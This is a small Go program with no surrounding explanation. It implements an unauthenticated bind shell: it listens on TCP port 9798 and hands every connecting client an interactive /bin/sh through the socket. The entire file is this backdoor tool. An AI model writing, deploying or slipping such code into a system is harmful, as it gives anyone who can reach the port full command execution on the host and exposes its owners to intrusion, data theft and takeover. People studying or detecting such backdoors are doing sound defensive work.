package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

func handle(con net.Conn) {

	cmd := exec.Command("/bin/sh", "-i")

	r, w := io.Pipe()

	cmd.Stdin = con
	cmd.Stdout = w

	go io.Copy(con, r)

	cmd.Run()

	con.Close()
}
func main() {

	listener, err := net.Listen("tcp", ":9798")

	if err != nil {

		log.Println("Error in binding", err)
	}

	for {

		conn, err := listener.Accept()

		if err != nil {
			log.Println("Error in connection")
		}

		go handle(conn)
	}
}
